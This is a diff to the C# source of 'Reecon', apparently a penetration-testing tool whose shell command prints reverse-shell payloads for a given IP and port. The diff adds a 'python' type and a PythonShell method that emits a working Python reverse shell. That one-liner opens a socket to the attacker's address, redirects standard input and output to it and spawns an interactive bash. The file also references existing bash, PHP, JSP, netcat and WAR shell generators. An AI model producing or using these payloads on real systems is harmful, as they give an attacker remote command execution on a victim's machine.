@@ -10,12 +10,18 @@ namespace Reecon
             if (args.Length < 2)
             {
                 Console.WriteLine("Shell Usage: reecon --shell shellType [IP Port]");
-                Console.WriteLine("Types: bash, jsp, nc, nodejs, php, war");
+                Console.WriteLine("Types: bash, jsp, nc, nodejs, php, python, war");
+                General.GetIP();
                 return;
             }
             string shellType = args[1];
             string ip = "10.0.0.1";
             string port = "9001";
+            if (args.Length == 2)
+            {
+                Console.WriteLine("Don't forget to change the IP / Port!");
+                General.GetIP();
+            }
             if (args.Length == 3)
             {
                 ip = args[2];
@@ -57,6 +63,13 @@ namespace Reecon
                 Console.WriteLine("---------");
                 Console.WriteLine(PHPShell(ip, port));
             }
+            else if (shellType == "python")
+            {
+                Console.WriteLine("Python Shell");
+                Console.WriteLine("------------");
+                Console.WriteLine(PythonShell(ip, port));
+
+            }
             else if (shellType == "war")
             {
                 Console.WriteLine("WAR Shell");
@@ -70,7 +83,6 @@ namespace Reecon
             {
                 Console.WriteLine("Unknown Shell: " + shellType);
             }
-            General.GetIP();
         }
 
         private static string BashShell(string ip, string port)
@@ -108,6 +120,11 @@ namespace Reecon
             return "Regular: <?php " + plainShell + " ?>" + Environment.NewLine
                 + "Safer: <?php " + evalShell + " ?>" + Environment.NewLine
                 + "No Upload: php -r \"" + evalShell + "\"";
+        }
+
+        private static string PythonShell(string ip, string port)
+        {
+            return $"import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('{ip}', {port})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(['/bin/bash', '-i']);";
         }
     }
 }
